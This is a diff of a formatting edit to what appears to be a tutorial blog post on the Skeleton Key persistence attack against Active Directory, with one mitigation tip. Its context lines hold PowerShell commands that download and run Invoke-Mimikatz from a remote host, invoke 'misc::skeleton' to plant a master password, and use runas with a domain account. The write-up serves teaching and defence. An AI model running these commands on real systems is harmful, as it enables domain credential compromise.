@@ -27,7 +27,7 @@ Now I will execute the Mimikatz tool using this command:
  iex(New-Object Net.WebClient).DownloadString('http://192.168.56.1/Invoke-Mimikatz.ps1')
 ```
 [![Image Alt Text](/assets/img/posts/Persistence/Skeleton Key/2024-02-14-2.png)](https://r00tven0m.github.io/)
-After that, we execute this command:
+After that, we execute  this command:
 
 ```powershell
 Invoke-Mimikatz -Command '"misc::skeleton"'
@@ -66,4 +66,4 @@ runas /user:cbank\abdessalam.louhidi "powershell.exe"
 3 - Run lsass.exe as a protected process, it forces an attacker to load a kernel mode drive
 
 
-`We have reached the  end of the article.`
+We have reached the  end of the article.
